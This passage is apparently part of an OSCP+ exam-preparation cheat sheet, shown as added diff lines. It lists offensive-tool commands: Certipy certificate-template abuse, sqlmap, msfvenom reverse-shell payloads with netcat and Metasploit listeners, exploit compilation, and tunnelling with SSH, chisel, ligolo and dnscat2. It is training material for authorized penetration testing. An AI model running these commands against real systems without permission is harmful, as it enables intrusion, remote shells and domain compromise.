+<blockquote>
+<p>Collection/ingestion versions must match. Validate chosen edges manually.</p>
+</blockquote>
+<h3 id="certipy">Certipy</h3>
+<pre><code class="language-bash">certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -enabled -vulnerable -stdout
+certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -target DC_HOST -ca CA_NAME -template TEMPLATE
+certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
+</code></pre>
+<blockquote>
+<p>Some packages expose <code>certipy</code> instead of <code>certipy-ad</code>. <a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">AD CS procedure</a></p>
+</blockquote>
+<h2 id="web-exploitation-tools">Web exploitation tools</h2>
+<h3 id="sqlmap">SQLmap</h3>
+<pre><code class="language-bash"># Lab/reference only; prohibited on the OSCP+ exam
+sqlmap -r request.txt --batch --dbs
+</code></pre>
+<blockquote>
+<p>Preserve only as a lab/research comparator. Use <a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">manual SQL injection</a> for exam preparation.</p>
+</blockquote>
+<h3 id="wpscan">WPScan</h3>
+<pre><code class="language-bash">wpscan --url https://HOSTNAME/ --disable-tls-checks --enumerate vp,vt,u --plugins-detection mixed -o wpscan.txt
+</code></pre>
+<blockquote>
+<p>Verify active component/version and configuration manually. <a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress procedure</a></p>
+</blockquote>
+<h2 id="payload-and-pivot-tools">Payload and pivot tools</h2>
+<h3 id="searchsploit-and-exploit-toolchains">SearchSploit and exploit toolchains</h3>
+<pre><code class="language-bash">searchsploit --cve CVE
+searchsploit -t "PRODUCT VERSION"
+searchsploit PRODUCT VERSION --exclude="/dos/"
+searchsploit -x EDB_ID
+searchsploit -m EDB_ID
+</code></pre>
+<pre><code class="language-bash">python3 -m py_compile exploit.py
+gcc -Wall -Wextra exploit.c -o exploit
+i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe -lws2_32
+x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe -lws2_32
+file exploit exploit-x86.exe exploit-x64.exe
+</code></pre>
+<blockquote>
+<p>Audit source first; match exact prerequisites; compile for where the exploit program runs and generate payloads for the target execution context. <a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public exploit procedure</a></p>
+</blockquote>
+<h3 id="msfvenom-multihandler-and-netcat">msfvenom, multi/handler and Netcat</h3>
+<pre><code class="language-bash">msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'
+msfvenom --list formats
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe
+rlwrap nc -lvnp LPORT
+ncat -4 -lvn 0.0.0.0 LPORT
+</code></pre>
+<pre><code class="language-text">msfconsole -q
+use exploit/multi/handler
+set PAYLOAD PAYLOAD_NAME
+set LHOST LHOST
+set LPORT LPORT
+set ExitOnSession false
+show options
+run -j
+jobs -l
+sessions -l
+sessions -i SESSION_ID
+</code></pre>
+<blockquote>
+<p><code>nc</code> and Nmap Ncat have different option conventions. A staged name such as <code>shell/reverse_tcp</code> needs an exact staging handler; <code>shell_reverse_tcp</code> is the common stageless form. <code>msfvenom</code> and <code>multi/handler</code> have across-target exam exceptions, but Meterpreter remains one-target restricted. <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shell procedure</a> and <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">payload diagnosis</a></p>
+</blockquote>
+<h3 id="windows-payload-control-evidence">Windows payload-control evidence</h3>
+<pre><code class="language-powershell">Get-ExecutionPolicy -List
+$ExecutionContext.SessionState.LanguageMode
+Get-MpComputerStatus |
+  Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled
+Get-MpThreatDetection |
+  Select-Object InitialDetectionTime,ThreatID,ActionSuccess,Resources
+Get-AppLockerPolicy -Effective -Xml
+Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 50
+Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' -MaxEvents 50
+Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/MSI and Script' -MaxEvents 50
+</code></pre>
+<blockquote>
+<p>Separate execution policy, language mode, AMSI, application control, antimalware, permissions and architecture. Missing cmdlets/logs are inconclusive. <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload diagnosis</a></p>
+</blockquote>
+<h3 id="metasploit-restricted-module-workflow">Metasploit restricted module workflow</h3>
+<pre><code class="language-text">search type:exploit cve:CVE_ID
+info MODULE_PATH
+use MODULE_PATH
+show options
+show advanced
+show targets
+show payloads
+set RHOSTS TARGET
+set RPORT PORT
+set TARGET TARGET_ID
+set PAYLOAD PAYLOAD_NAME
+show missing
+run
+</code></pre>
+<blockquote>
+<p>Auxiliary, Exploit or Post modules—or Meterpreter—lock use to one selected exam target even if <code>check</code> or the attempt fails. Metasploit pivoting and automatic exploitation are prohibited. Module rank is not vulnerability proof.</p>
+</blockquote>
+<h3 id="ssh-forwarding-and-proxychains">SSH forwarding and ProxyChains</h3>
+<pre><code class="language-bash">ssh -N -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT -p SSH_PORT USER@PIVOT -o ExitOnForwardFailure=yes
+ssh -N -D 127.0.0.1:1080 -p SSH_PORT USER@PIVOT -o ExitOnForwardFailure=yes
+ssh -N -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT -p KALI_SSH_PORT KALI_USER@LHOST -o ExitOnForwardFailure=yes
+ssh -N -R 127.0.0.1:1080 -p KALI_SSH_PORT KALI_USER@LHOST -o ExitOnForwardFailure=yes
+ssh -J PIVOT_USER@PIVOT TARGET_USER@INTERNAL_HOST
+
+proxychains4 -q -f ./proxychains-pivot.conf nmap -sT -Pn -n -p PORTS INTERNAL_HOST
+curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_HOST:PORT/
+</code></pre>
+<blockquote>
+<p><code>-L</code>/<code>-D</code> listen on the SSH client; <code>-R</code> listens on the SSH server. ProxyChains is TCP-only and cannot carry SYN/ICMP/UDP/pcap operations. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Pivoting procedure</a></p>
+</blockquote>
+<h3 id="socat-sshuttle-and-windows-relays">Socat, sshuttle and Windows relays</h3>
+<pre><code class="language-bash">socat -ddd TCP-LISTEN:LOCAL_PORT,bind=PIVOT_REACHABLE_IP,reuseaddr,fork TCP:INTERNAL_HOST:INTERNAL_PORT
+sudo sshuttle --dns -r SSH_USER@PIVOT:SSH_PORT INTERNAL_SUBNET
+</code></pre>
+<pre><code class="language-cmd">plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" -l KALI_USER -pwfile C:\PATH\kali-password.txt -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT -P KALI_SSH_PORT LHOST
+netsh interface portproxy add v4tov4 listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT connectaddress=INTERNAL_HOST connectport=INTERNAL_PORT
+netsh interface portproxy show all
+</code></pre>
+<blockquote>
+<p>Socat is a clear fixed relay. sshuttle creates a selected-subnet TCP/DNS-oriented route. Netsh is elevated, persistent and TCP-only; record firewall changes and cleanup.</p>
+</blockquote>
+<h3 id="chisel-and-ligolo-ng">Chisel and Ligolo-ng</h3>
+<pre><code class="language-bash">chisel server --reverse --port CHISEL_PORT
+chisel client --fingerprint 'SERVER_FINGERPRINT' LHOST:CHISEL_PORT R:127.0.0.1:1080:socks
+
+./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT
+./agent -connect LHOST:LIGOLO_PORT -accept-fingerprint CERT_FINGERPRINT
+</code></pre>
+<p>Ligolo console:</p>
+<pre><code class="language-text">interface_create --name ligolo
+session
+interface_add_route --name ligolo --route INTERNAL_SUBNET
+tunnel_start --tun ligolo
+listener_add --addr 0.0.0.0:PIVOT_PORT --to 127.0.0.1:KALI_PORT --tcp
+</code></pre>
+<blockquote>
+<p>Current Chisel <code>socks</code> is TCP CONNECT; <code>udpsocks</code> adds SOCKS5 UDP ASSOCIATE for compatible current peers/clients. This does not add UDP support to ProxyChains. Ligolo supplies routed access; agent listeners handle reverse callbacks. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Pivoting procedure</a></p>
+</blockquote>
+<h3 id="dnscat2">dnscat2</h3>
+<pre><code class="language-bash">dnscat2-server --secret=SHARED_SECRET TUNNEL_DOMAIN
+./dnscat --secret=SHARED_SECRET TUNNEL_DOMAIN
+./dnscat --dns server=DNS_SERVER,port=53 --secret=SHARED_SECRET
+</code></pre>
+<blockquote>
+<p>Conditional DNS-only route requiring client execution and authoritative delegation or direct DNS-server reachability. Validate the resolver path before the encrypted session.</p>
+</blockquote>
+<h3 id="evidence-capture-and-final-report-package">Evidence capture and final report package</h3>
+<pre><code class="language-bash">mkdir -p evidence/{nmap,web,loot,sessions,screenshots}
+script -q -f evidence/session.txt
+# Run the intended commands, then exit to close/flush the transcript.
+sha256sum FILE | tee FILE.sha256
+
+7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
+7z l OSCP-OS-XXXXX-Exam-Report.7z
+7z t OSCP-OS-XXXXX-Exam-Report.7z
+md5sum OSCP-OS-XXXXX-Exam-Report.7z
+</code></pre>
+<pre><code class="language-powershell">Start-Transcript -Path .\evidence\powershell-session.txt
+Get-FileHash -Algorithm SHA256 -LiteralPath '.\FILE'
+Get-FileHash -Algorithm MD5 -LiteralPath '.\OSCP-OS-XXXXX-Exam-Report.7z'
+Stop-Transcript
+</code></pre>
+<blockquote>
+<p>A transcript supports reproduction but is not the final narrative. Recheck the current guide, inspect every PDF page, confirm the archive contains only the correctly named PDF, compare the local/upload MD5 and complete final submission. <a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated evidence procedure</a></p>
+</blockquote>
+<h2 id="sources">Sources</h2>
+<ul>
+<li><a href="https://lizajose.github.io/getSH/tool-cheatsheet">getSH Tool Cheatsheet</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li>Linked upstream/project documentation in each canonical procedure</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">Current OSCP+ exam guide</a></li>
+</ul></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
